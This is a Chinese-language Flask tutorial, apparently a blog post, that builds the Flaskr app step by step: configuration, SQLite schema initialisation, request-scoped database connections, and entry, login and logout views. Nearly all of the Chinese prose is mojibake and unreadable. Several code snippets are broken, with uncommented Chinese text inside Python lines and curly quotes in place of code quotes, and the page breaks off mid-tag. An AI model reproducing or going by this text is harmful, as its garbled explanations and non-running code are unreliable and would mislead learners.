import Flask, request, session, g, redirect, url_for, abort, render_template, flash</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®æ–‡ä»¶</span></span><br><span class="line">DATABASE = '/tmp/flaskr.db'</span><br><span class="line">ENV = 'development'</span><br><span class="line">DEBUG = True</span><br><span class="line">SECRET_KEY = 'development key'</span><br><span class="line">USERNAME = 'admin'</span><br><span class="line">PASSWORD = 'default'</span><br></pre></td></tr></table></figure></p><p>ï¼Œä¿®æ”¹ flaskr.py æ–‡ä»¶åœ¨å…¶ä¸­é…ç½®åˆå§‹åŒ–:</p><h1 id="åˆ›å»ºåº”ç”¨"><a href="#åˆ›å»ºåº”ç”¨" class="headerlink" title="åˆ›å»ºåº”ç”¨"></a>åˆ›å»ºåº”ç”¨</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app<span class="selector-class">.config</span><span class="selector-class">.from_object</span>(__name__)</span><br></pre></td></tr></table></figure><p>from_object()å°†ä¼šå¯»æ‰¾ç»™å®šçš„å¯¹è±¡(å¦‚æœå®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ™ä¼šå¯¼å…¥å®ƒ)ï¼Œæœå¯»é‡Œé¢å®šä¹‰çš„å…¨éƒ¨å¤§å†™çš„å˜é‡ã€‚åœ¨æˆ‘ä»¬çš„è¿™ç§æƒ…å†µä¸­ï¼Œé…ç½®æ–‡ä»¶å°±æ˜¯æˆ‘ä»¬ä¸Šé¢å†™çš„å‡ è¡Œä»£ç ã€‚ ä½ ä¹Ÿå¯ä»¥å°†ä»–ä»¬åˆ†åˆ«å­˜å‚¨åˆ°å¤šä¸ªæ–‡ä»¶ã€‚</p><p>é€šå¸¸ä»é…ç½®æ–‡ä»¶ä¸­åŠ è½½é…ç½®æ˜¯ä¸€ä¸ªå¥½çš„ä¸»æ„ã€‚è¿™æ—¶å¯ä»¥ä½¿ç”¨from_envvar()æ¥å®ç°ï¼Œå¯ä»¥ç”¨å®ƒæ›¿æ¢ä¸Šé¢çš„from_object()ï¼š</p><p>app.config.from_envvar(â€˜FLASKR_SETTINGSâ€™, silent=True)<br>è¿™ç§æ–¹æ³•æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€ä¸ªåä¸ºFLASKR_SETTINGSçš„ç¯å¢ƒå˜é‡æ¥è®¾å®šä¸€ä¸ªé…ç½®æ–‡ä»¶è½½å…¥åæ˜¯å¦è¦†ç›–é»˜è®¤å€¼ã€‚é™é»˜å¼€å…³silent=Trueå‘Šè¯‰ Flask ä¸å»å…³å¿ƒè¿™ä¸ªç¯å¢ƒå˜é‡é”®å€¼æ˜¯å¦å­˜åœ¨ã€‚</p><p>SECRET_KEYæ˜¯ä¸ºäº†ä¿æŒå®¢æˆ·ç«¯çš„ä¼šè¯å®‰å…¨ã€‚æ˜æ™ºåœ°é€‰æ‹©è¯¥é”®ï¼Œä½¿å¾—å®ƒéš¾ä»¥çŒœæµ‹ï¼Œæœ€å¥½æ˜¯å°½å¯èƒ½å¤æ‚ã€‚</p><p>DEBUG è°ƒè¯•æ ‡å¿—å¯ç”¨æˆ–ç¦ç”¨äº¤äº’å¼è°ƒè¯•ã€‚å†³ä¸è®©è°ƒè¯•æ¨¡å¼åœ¨ç”Ÿäº§ç³»ç»Ÿä¸­å¯åŠ¨ï¼Œå› ä¸ºå®ƒå°†å…è®¸ç”¨æˆ·åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»£ç ï¼</p><p>æˆ‘ä»¬è¿˜æ·»åŠ äº†ä¸€ä¸ªè½»æ¾åœ°è¿æ¥åˆ°æŒ‡å®šæ•°æ®åº“çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ç”¨äºåœ¨è¯·æ±‚æ—¶æ‰“å¼€ä¸€ä¸ªè¿æ¥ï¼Œå¹¶ä¸”åœ¨äº¤äº’å¼ Python shell å’Œè„šæœ¬ä¸­ä¹Ÿèƒ½ä½¿ç”¨ï¼Œè¿™å°†æ–¹ä¾¿åé¢çš„ä½¿ç”¨ã€‚</p><p>åœ¨ Code/flaskr.py æ–‡ä»¶ä¸­ç»§ç»­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p><p>def connect_db():<br>    return sqlite3.connect(app.config[â€˜DATABASEâ€™])<br>æœ€åå¦‚æœæˆ‘ä»¬æƒ³è¦æŠŠè¿™ä¸ªæ–‡ä»¶å½“åšç‹¬ç«‹åº”ç”¨æ¥è¿è¡Œï¼Œåªéœ€åœ¨æœåŠ¡å™¨å¯åŠ¨æ–‡ä»¶ä¹Ÿå°±æ˜¯ Code/flaskr.py æ–‡ä»¶çš„æœ«å°¾æ·»åŠ è¿™ä¸€è¡Œ:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.<span class="built_in">run</span>()</span><br></pre></td></tr></table></figure></p><p>å¦‚æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥é¡ºåˆ©å¼€å§‹è¿è¡Œè¿™ä¸ªåº”ç”¨ï¼Œé€šè¿‡ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">python3</span> flaskr.<span class="keyword">py</span></span><br><span class="line"> * Serving Flask app <span class="string">"flaskr"</span> (lazy loading)</span><br><span class="line"> * Environmen<span class="variable">t:</span> development</span><br><span class="line"> * Debug <span class="keyword">mode</span>: <span class="keyword">on</span></span><br><span class="line"> * Running <span class="keyword">on</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span>/ (Press CTRL+C <span class="keyword">to</span> <span class="keyword">quit</span>)</span><br><span class="line"> * Restarting with stat</span><br><span class="line"> * Debugger <span class="keyword">is</span> active!</span><br><span class="line"> * Debugger PIN: <span class="number">289</span>-<span class="number">075</span>-<span class="number">564</span></span><br></pre></td></tr></table></figure></p><p>ä½ å°†ä¼šçœ‹åˆ°ä¸€ä¸ªä¿¡æ¯ï¼Œä¿¡æ¯æç¤ºä½ æœåŠ¡å™¨å¯åŠ¨çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€ä½ èƒ½å¤Ÿè®¿é—®åˆ°çš„ã€‚</p><p>å½“ä½ åœ¨æµè§ˆå™¨ä¸­è®¿é—®æœåŠ¡å™¨è·å¾—ä¸€ä¸ª 404 Not Found çš„é”™è¯¯æ—¶ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰ä»»ä½•è§†å›¾ã€‚æˆ‘ä»¬ä¹‹åå†æ¥å…³æ³¨è¿™äº›ã€‚é¦–å…ˆåº”è¯¥è®©æ•°æ®åº“å·¥ä½œèµ·æ¥ã€‚</p><h1 id="Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆäºŒï¼‰"><a href="#Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆäºŒï¼‰" class="headerlink" title="Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆäºŒï¼‰"></a>Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆäºŒï¼‰</h1><h2 id="åˆ›å»ºæ•°æ®åº“"><a href="#åˆ›å»ºæ•°æ®åº“" class="headerlink" title="åˆ›å»ºæ•°æ®åº“"></a>åˆ›å»ºæ•°æ®åº“</h2><p>å¦‚å‰é¢æ‰€è¿°ï¼ŒFlaskr æ˜¯ä¸€ä¸ªæ•°æ®åº“é©±åŠ¨çš„åº”ç”¨ç¨‹åºï¼Œå‡†ç¡®åœ°æ¥è¯´ï¼ŒFlaskr æ˜¯ä¸€ä¸ªä½¿ç”¨å…³ç³»æ•°æ®åº“ç³»ç»Ÿçš„åº”ç”¨ç¨‹åºã€‚è¿™æ ·çš„ç³»ç»Ÿéœ€è¦ä¸€ä¸ªæ¨¡å¼å‘Šè¯‰å®ƒä»¬å¦‚ä½•å­˜å‚¨ä¿¡æ¯ã€‚å› æ­¤åœ¨é¦–æ¬¡å¯åŠ¨æœåŠ¡å™¨ä¹‹å‰ï¼Œåˆ›å»ºæ•°æ®åº“æ¨¡å¼æ˜¯å¾ˆé‡è¦çš„ã€‚</p><p>å¯ä»¥é€šè¿‡ç®¡é“æŠŠ schema.sql ä½œä¸º sqlite 3 å‘½ä»¤çš„è¾“å…¥æ¥åˆ›å»ºè¿™ä¸ªæ¨¡å¼ï¼Œå‘½ä»¤å¦‚ä¸‹:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 /tmp/flaskr<span class="selector-class">.db</span> &lt; schema.sql</span><br></pre></td></tr></table></figure></p><p>è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹æ˜¯éœ€è¦å®‰è£… sqlite 3 å‘½ä»¤ï¼Œè€Œä¸”ä½ å¿…é¡»æä¾›æ•°æ®åº“çš„è·¯å¾„ï¼Œå¦åˆ™å°†æŠ¥é”™ã€‚ç”±äºå®éªŒæ¥¼ç¯å¢ƒä¸­æ²¡æœ‰å®‰è£… sqllite3 æ‰€ä»¥ä¼šå¾—åˆ°æŠ¥é”™command not found: sqlite3ã€‚</p><p>æ·»åŠ ä¸€ä¸ªå‡½æ•°æ¥å¯¹æ•°æ®åº“è¿›è¡Œåˆå§‹åŒ–æ˜¯ä¸ªä¸é”™çš„æƒ³æ³•ã€‚å¦‚æœä½ æƒ³è¦è¿™ä¹ˆåšï¼Œé¦–å…ˆå¿…é¡»ä»contextlibåŒ…ä¸­å¯¼å…¥contextlib.closing()å‡½æ•°ã€‚åœ¨ Code/flaskr.py æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç :<br><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> closing</span><br></pre></td></tr></table></figure></p><p>æ¥ç€æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªç§°ä¸º init_db å‡½æ•°ï¼Œè¯¥å‡½æ•°ç”¨æ¥åˆå§‹åŒ–æ•°æ®åº“ã€‚ä¸ºæ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¹‹å‰å®šä¹‰çš„ connect_db å‡½æ•°ã€‚ åªè¦åœ¨ Code/flaskr.py æ–‡ä»¶ä¸­çš„ connect_db å‡½æ•°ä¸‹æ·»åŠ è¿™æ ·çš„å‡½æ•°:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_db</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> closing(connect_db()) <span class="keyword">as</span> db:</span><br><span class="line">        <span class="keyword">with</span> app.open_resource(<span class="string">'schema.sql'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            db.cursor().executescript(f.read().decode())</span><br><span class="line">        db.commit()</span><br></pre></td></tr></table></figure></p><p>closing()å‡½æ•°å…è®¸æˆ‘ä»¬åœ¨withå—ä¸­ä¿æŒæ•°æ®åº“è¿æ¥å¯ç”¨ã€‚åº”ç”¨å¯¹è±¡çš„open_resource()æ–¹æ³•åœ¨å…¶æ–¹æ¡†å¤–ä¹Ÿæ”¯æŒè¿™ä¸ªåŠŸèƒ½ï¼Œå› æ­¤å¯ä»¥åœ¨withå—ä¸­ç›´æ¥ä½¿ç”¨ã€‚è¿™ä¸ªå‡½æ•°ä»å½“å‰ä½ç½®ï¼ˆä½ çš„flaskr æ–‡ä»¶å¤¹ï¼‰ä¸­æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”å…è®¸ä½ è¯»å–å®ƒã€‚æˆ‘ä»¬åœ¨è¿™é‡Œç”¨å®ƒåœ¨æ•°æ®åº“è¿æ¥ä¸Šæ‰§è¡Œä¸€ä¸ªè„šæœ¬ã€‚</p><p>å½“æˆ‘ä»¬è¿æ¥åˆ°æ•°æ®åº“æ—¶ä¼šå¾—åˆ°ä¸€ä¸ªæ•°æ®åº“è¿æ¥å¯¹è±¡ï¼ˆè¿™é‡Œå‘½åå®ƒä¸º dbï¼‰ï¼Œè¿™ä¸ªå¯¹è±¡æä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªæ•°æ®åº“æŒ‡é’ˆã€‚æŒ‡é’ˆä¸Šæœ‰ä¸€ä¸ªå¯ä»¥æ‰§è¡Œå®Œæ•´è„šæœ¬çš„æ–¹æ³•ã€‚æœ€åæˆ‘ä»¬ä¸æ˜¾å¼åœ°æäº¤æ›´æ”¹ï¼Œ SQLite 3 æˆ–è€…å…¶å®ƒäº‹åŠ¡æ•°æ®åº“ä¸ä¼šè¿™ä¹ˆåšã€‚</p><p>ç°åœ¨å¯ä»¥åœ¨ Python shell é‡Œåˆ›å»ºæ•°æ®åº“ï¼Œå¯¼å…¥å¹¶è°ƒç”¨åˆšæ‰çš„å‡½æ•°:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; from flaskr import init_db</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; init_db()</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„:</p><p>å¦‚æœä½ åé¢å¾—åˆ°ä¸€ä¸ªè¡¨ä¸èƒ½æ‰¾åˆ°çš„å¼‚å¸¸ï¼Œè¯·æ£€æŸ¥ä½ æ˜¯å¦è°ƒç”¨äº† init_db å‡½æ•°ä»¥åŠä½ çš„è¡¨åæ˜¯å¦æ­£ç¡® (ä¾‹å¦‚ï¼š singular vs. plural)ã€‚</p><h2 id="è¯·æ±‚æ•°æ®åº“è¿æ¥"><a href="#è¯·æ±‚æ•°æ®åº“è¿æ¥" class="headerlink" title="è¯·æ±‚æ•°æ®åº“è¿æ¥"></a>è¯·æ±‚æ•°æ®åº“è¿æ¥</h2><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†æ€æ ·å»ºç«‹æ•°æ®åº“è¿æ¥ä»¥åŠåœ¨è„šæœ¬ä¸­ä½¿ç”¨è¿™äº›è¿æ¥ï¼Œä½†æ˜¯æˆ‘ä»¬å¦‚ä½•èƒ½ä¼˜é›…åœ°åœ¨è¯·æ±‚ä¸­è¿™ä¹ˆåšï¼Ÿ</p><p>æ‰€æœ‰æˆ‘ä»¬çš„å‡½æ•°ä¸­éƒ½éœ€è¦æ•°æ®åº“è¿æ¥ï¼Œå› æ­¤åœ¨è¯·æ±‚ä¹‹å‰åˆå§‹åŒ–å®ƒä»¬ï¼Œåœ¨è¯·æ±‚ç»“æŸåè‡ªåŠ¨å…³é—­å®ƒä»¬å°±å¾ˆæœ‰æ„ä¹‰ã€‚</p><p>Flask å…è®¸æˆ‘ä»¬ä½¿ç”¨before_request()ï¼Œafter_request()å’Œ teardown_request()è£…é¥°å™¨æ¥å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œåœ¨ Code/flaskr.py æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç :<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@app</span>.before_request</span><br><span class="line">def before_request():</span><br><span class="line">    g.db = connect_db()</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.teardown_request</span><br><span class="line">def teardown_request(exception):</span><br><span class="line">    g.db.close()</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨before_request()è£…é¥°å™¨çš„å‡½æ•°ä¼šåœ¨è¯·æ±‚ä¹‹å‰è¢«è°ƒç”¨è€Œä¸”ä¸å¸¦å‚æ•°ã€‚ä½¿ç”¨after_request()è£…é¥°å™¨çš„å‡½æ•°ä¼šåœ¨è¯·æ±‚ä¹‹åè¢«è°ƒç”¨ä¸”ä¼ å…¥å°†è¦å‘ç»™å®¢æˆ·ç«¯çš„å“åº”ã€‚</p><p>å®ƒä»¬å¿…é¡»è¿”å›é‚£ä¸ªå“åº”å¯¹è±¡æˆ–æ˜¯ä¸åŒçš„å“åº”å¯¹è±¡ã€‚ä½†å½“å¼‚å¸¸æŠ›å‡ºæ—¶ï¼Œå®ƒä»¬ä¸ä¸€å®šä¼šè¢«æ‰§è¡Œï¼Œè¿™æ—¶å¯ä»¥ä½¿ç”¨teardown_request()è£…é¥°å™¨ã€‚å®ƒè£…é¥°çš„å‡½æ•°å°†åœ¨å“åº”æ„é€ åæ‰§è¡Œï¼Œå¹¶ä¸å…è®¸ä¿®æ”¹è¯·æ±‚ï¼Œè¿”å›çš„å€¼ä¼šè¢«å¿½ç•¥ã€‚å¦‚æœåœ¨è¯·æ±‚å·²ç»è¢«å¤„ç†çš„æ—¶å€™æŠ›å‡ºå¼‚å¸¸ï¼Œå®ƒä¼šè¢«ä¼ é€’åˆ°æ¯ä¸ªå‡½æ•°ï¼Œå¦åˆ™ä¼šä¼ å…¥ä¸€ä¸ªNoneã€‚</p><p>æˆ‘ä»¬æŠŠå½“å‰çš„æ•°æ®åº“è¿æ¥ä¿å­˜åœ¨ Flask æä¾›çš„ g ç‰¹æ®Šå¯¹è±¡ä¸­ã€‚è¿™ä¸ªå¯¹è±¡åªèƒ½ä¿å­˜ä¸€æ¬¡è¯·æ±‚çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨æ¯ä¸ªå‡½æ•°é‡Œéƒ½å¯ç”¨ã€‚ä¸è¦ç”¨å…¶å®ƒå¯¹è±¡æ¥ä¿å­˜ä¿¡æ¯ï¼Œå› ä¸ºåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹å°†ä¸å¯è¡Œã€‚ç‰¹æ®Šçš„å¯¹è±¡ g åœ¨åå°æœ‰ä¸€äº›ç¥å¥‡çš„æœºåˆ¶æ¥ä¿è¯å®ƒåœ¨åšæ­£ç¡®çš„äº‹æƒ…ã€‚</p><h1 id="Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆä¸‰ï¼‰"><a href="#Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆä¸‰ï¼‰" class="headerlink" title="Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆä¸‰ï¼‰"></a>Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆä¸‰ï¼‰</h1><h2 id="è§†å›¾"><a href="#è§†å›¾" class="headerlink" title="è§†å›¾"></a>è§†å›¾</h2><h3 id="æ˜¾ç¤ºæ¡ç›®"><a href="#æ˜¾ç¤ºæ¡ç›®" class="headerlink" title="æ˜¾ç¤ºæ¡ç›®"></a>æ˜¾ç¤ºæ¡ç›®</h3><p>è¿™ä¸ªè§†å›¾æ˜¾ç¤ºæ‰€æœ‰å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¡ç›®ã€‚å®ƒç›‘å¬ç€åº”ç”¨çš„æ ¹åœ°å€ä»¥åŠå°†ä¼šä»æ•°æ®åº“ä¸­æŸ¥è¯¢æ ‡é¢˜å’Œå†…å®¹ã€‚idå€¼æœ€å¤§çš„æ¡ç›®ï¼ˆæœ€æ–°çš„æ¡ç›®ï¼‰å°†åœ¨æœ€å‰é¢ã€‚ä»æ¸¸æ ‡è¿”å›çš„è¡Œæ˜¯æŒ‰selectè¯­å¥ä¸­å£°æ˜çš„åˆ—ç»„ç»‡çš„å…ƒç»„ã€‚å¯¹äºåƒæˆ‘ä»¬è¿™æ ·çš„å°åº”ç”¨æ˜¯è¶³å¤Ÿçš„ï¼Œä½†æ˜¯ä½ å¯èƒ½è¦æŠŠå®ƒä»¬è½¬æ¢æˆå­—å…¸ï¼Œå¦‚æœä½ å¯¹å¦‚ä½•è½¬æ¢æˆå­—å…¸æ„Ÿå…´è¶£çš„è¯ï¼Œè¯·æŸ¥é˜…ç®€åŒ–æŸ¥è¯¢ä¾‹å­ã€‚</p><p>è§†å›¾å‡½æ•°å°†ä¼šæŠŠæ¡ç›®ä½œä¸ºå­—å…¸ä¼ å…¥show_entries.html æ¨¡æ¿å¹¶è¿”å›æ¸²æŸ“ç»“æœã€‚</p><p>åœ¨ flaskr/flaskr.py æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç :<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_entries</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    cur = g.db.execute(<span class="string">'select title, text from entries order by id desc'</span>)    æŸ¥è¯¢è¯­å¥</span><br><span class="line">    entries = [dict(title=row[<span class="number">0</span>], text=row[<span class="number">1</span>]) <span class="keyword">for</span> row <span class="keyword">in</span> cur.fetchall()]    å°†æŸ¥è¯¢ç»“æœè½¬æ¢ä¸ºå­—å…¸</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'show_entries.html'</span>, entries=entries)</span><br></pre></td></tr></table></figure></p><h3 id="æ·»åŠ æ¡ç›®"><a href="#æ·»åŠ æ¡ç›®" class="headerlink" title="æ·»åŠ æ¡ç›®"></a>æ·»åŠ æ¡ç›®</h3><p>è¿™ä¸ªè§†å›¾å…è®¸ç™»å½•çš„ç”¨æˆ·æ·»åŠ æ–°çš„æ¡ç›®ã€‚å®ƒåªå›åº”POSTè¯·æ±‚ï¼Œå®é™…çš„è¡¨å•æ˜¯æ˜¾ç¤ºåœ¨show_entriesé¡µé¢ã€‚å¦‚æœæ­£å¸¸å·¥ä½œçš„è¯ï¼Œæˆ‘ä»¬ç”¨flash()å‘ä¸‹ä¸€ä¸ªè¯·æ±‚é—ªç°ä¸€æ¡ä¿¡æ¯å¹¶ä¸”è·³è½¬å›show_entriesé¡µé¢ã€‚</p><p>åœ¨ flaskr/flaskr.py æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç :</p><p>@app.route(â€˜/addâ€™, methods=[â€˜POSTâ€™])<br>def add_entry():<br>    if not session.get(â€˜logged_inâ€™):<br>        abort(401)<br>    g.db.execute(â€˜insert into entries (title, text) values (?, ?)â€™,[request.form[â€˜titleâ€™], request.form[â€˜textâ€™]])   # å‘æ•°æ®åº“ä¸­æ’å…¥æ•°æ®<br>    g.db.commit()   # æ›´æ–°æ•°æ®<br>    flash(â€˜New entry was successfully postedâ€™)   # é—ªç°ä¸€æ¡æ¶ˆæ¯<br>    return redirect(url_for(â€˜show_entriesâ€™))<br>æ³¨æ„æˆ‘ä»¬è¿™é‡Œæ£€æŸ¥ç”¨æˆ·ç™»å½•æƒ…å†µ(logged_iné”®å­˜åœ¨ä¼šè¯ä¸­ï¼Œå¹¶ä¸”ä¸ºTrue)ã€‚å‘ SQL è¯­å¥ä¸­ä¼ é€’å‚æ•°ï¼Œéœ€è¦åœ¨è¯­å¥ä¸­ä½¿ç”¨é—®å·?æ¥ä»£æ›¿å‚æ•°ï¼Œå¹¶æŠŠå‚æ•°æ”¾åœ¨åˆ—è¡¨ä¸­è¿›è¡Œä¼ é€’ã€‚ä¸è¦ä½¿ç”¨å­—ç¬¦ä¸²æ ¼å¼åŒ–çš„æ–¹å¼ç›´æ¥æŠŠå‚æ•°ä¼ å…¥ SQL è¯­å¥ä¸­ï¼Œè¿™æ ·å¯èƒ½ä¼šæœ‰æ½œåœ¨çš„ SQL æ³¨å…¥é£é™©ã€‚</p><h3 id="ç™»å…¥å’Œæ³¨é”€"><a href="#ç™»å…¥å’Œæ³¨é”€" class="headerlink" title="ç™»å…¥å’Œæ³¨é”€"></a>ç™»å…¥å’Œæ³¨é”€</h3><p>è¿™äº›å‡½æ•°æ˜¯ç”¨äºç”¨æˆ·ç™»å½•ä»¥åŠæ³¨é”€ã€‚ç™»å½•æ—¶ä¾æ®åœ¨é…ç½®ä¸­çš„å€¼æ£€æŸ¥ç”¨æˆ·åå’Œå¯†ç å¹¶ä¸”åœ¨ä¼šè¯ä¸­è®¾ç½®logged_iné”®å€¼ã€‚å¦‚æœç”¨æˆ·æˆåŠŸç™»å½•ï¼Œlogged_iné”®å€¼è¢«è®¾ç½®æˆTrueï¼Œå¹¶è·³è½¬å›show_entriesé¡µé¢ã€‚æ­¤å¤–ï¼Œä¼šæœ‰æ¶ˆæ¯é—ªç°æ¥æç¤ºç”¨æˆ·ç™»å½•æˆåŠŸã€‚</p><p>å¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œæ¨¡æ¿ä¼šé€šçŸ¥ï¼Œå¹¶æç¤ºé‡æ–°ç™»å½•ã€‚åœ¨ flaskr/flaskr.py æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç :<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def login():</span><br><span class="line">    <span class="built_in">error</span> = None</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != app.<span class="built_in">config</span>[<span class="string">'USERNAME'</span>]:    å¦‚æœç”¨æˆ·åä¸ç¬¦åˆ</span><br><span class="line">            <span class="built_in">error</span> = <span class="string">'Invalid username'</span></span><br><span class="line">        elif request.form[<span class="string">'password'</span>] != app.<span class="built_in">config</span>[<span class="string">'PASSWORD'</span>]:    å¦‚æœå¯†ç ä¸ç¬¦åˆ</span><br><span class="line">            <span class="built_in">error</span> = <span class="string">'Invalid password'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'logged_in'</span>] = True    æˆåŠŸç™»å½•ï¼Œåœ¨ session ä¸­æ·»åŠ ä¸€ä¸ª logged_in å€¼ä¸º True</span><br><span class="line">            flash(<span class="string">'You were logged in'</span>)    é—ªç°ä¸€æ¡æ¶ˆæ¯</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'show_entries'</span>))    é‡å®šå‘åˆ°é¦–é¡µ</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, <span class="built_in">error</span>=<span class="built_in">error</span>)    å¦‚æœæ²¡æœ‰æˆåŠŸç™»å½•åˆ™è¿”å›ç™»å½•é¡µé¢ä»¥åŠé”™è¯¯ä¿¡æ¯</span><br></pre></td></tr></table></figure></p><p>å¦ä¸€æ–¹é¢ï¼Œæ³¨é”€å‡½æ•°ä»ä¼šè¯ä¸­ç§»é™¤äº†logged_iné”®å€¼ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªå¤§ç»æ‹›ï¼š<br>å¦‚æœä½ ä½¿ç”¨å­—å…¸çš„pop()æ–¹æ³•å¹¶ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ï¼ˆé»˜è®¤ï¼‰ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šä»å­—å…¸ä¸­åˆ é™¤è¿™ä¸ªé”®ï¼Œå¦‚æœè¿™ä¸ªé”®ä¸å­˜åœ¨åˆ™ä»€ä¹ˆéƒ½ä¸åšã€‚è¿™å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬ä¸éœ€è¦æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç»ç™»å…¥ã€‚<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/logout'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    session.pop(<span class="string">'logged_in'</span>, None)    ç§»é™¤ logged_in é”®</span><br><span class="line">    flash(<span class="string">'You were logged out'</span>)    é—ªç°æ¶ˆæ¯</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'show_entries'</span>))    é‡å®šå‘åˆ°é¦–é¡µ</span><br></pre></td></tr></table></figure></p><h2 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" 